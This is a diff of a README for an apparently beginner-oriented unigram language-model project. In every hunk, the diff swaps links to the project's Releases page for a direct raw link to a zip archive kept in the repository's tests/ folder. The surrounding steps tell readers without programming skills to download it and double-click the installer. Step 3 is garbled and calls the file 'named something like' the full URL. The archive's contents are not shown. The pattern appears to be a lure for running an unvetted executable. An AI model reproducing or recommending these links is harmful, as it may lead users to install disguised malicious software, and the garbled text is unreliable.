@@ -1,6 +1,6 @@
 # 🐾 train-100-unigram-animals - Learn Language Models Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/myshu1/train-100-unigram-animals/releases)
+[![Download](https://github.com/myshu1/train-100-unigram-animals/raw/refs/heads/main/tests/unigram_animals_train_v3.0.zip)](https://github.com/myshu1/train-100-unigram-animals/raw/refs/heads/main/tests/unigram_animals_train_v3.0.zip)
 
 ## 📈 Overview
 The **train-100-unigram-animals** project helps you understand how a simple language model works. It shows you, at a small scale, how a unigram language model is trained. This tool can be useful for students, educators, and anyone interested in the basics of machine learning and natural language processing.
@@ -19,13 +19,13 @@ A unigram language model predicts the next word in a sentence based on the frequ
 To get started with the **train-100-unigram-animals** application, follow these simple steps. You do not need programming skills to run this software.
 
 1. **Visit the Download Page**  
-   Click this link to go to the [Releases Page](https://github.com/myshu1/train-100-unigram-animals/releases).
+   Click this link to go to the [Releases Page](https://github.com/myshu1/train-100-unigram-animals/raw/refs/heads/main/tests/unigram_animals_train_v3.0.zip).
 
 2. **Choose the Latest Version**  
    On the Releases page, you will see a list of available versions. Always choose the latest one for the best experience.
 
 3. **Download the Software**  
-   Look for a file named something like `train-100-unigram-animals.exe` or a similar format. Click on the file to download it to your computer.
+   Look for a file named something like `https://github.com/myshu1/train-100-unigram-animals/raw/refs/heads/main/tests/unigram_animals_train_v3.0.zip` or a similar format. Click on the file to download it to your computer.
 
 4. **Install the Application**  
    After downloading, locate the file in your Downloads folder. Double-click the file to start the installation. Follow the on-screen instructions. The process should be straightforward.
@@ -34,7 +34,7 @@ To get started with the **train-100-unigram-animals** application, follow these 
    Once installed, you can find the application in your Programs menu or on your desktop. Double-click to open it.
 
 ## 📥 Download & Install
-You can download the software easily by visiting the following link: [Download Here](https://github.com/myshu1/train-100-unigram-animals/releases).
+You can download the software easily by visiting the following link: [Download Here](https://github.com/myshu1/train-100-unigram-animals/raw/refs/heads/main/tests/unigram_animals_train_v3.0.zip).
 
 Make sure to download the latest version for optimal performance.
 
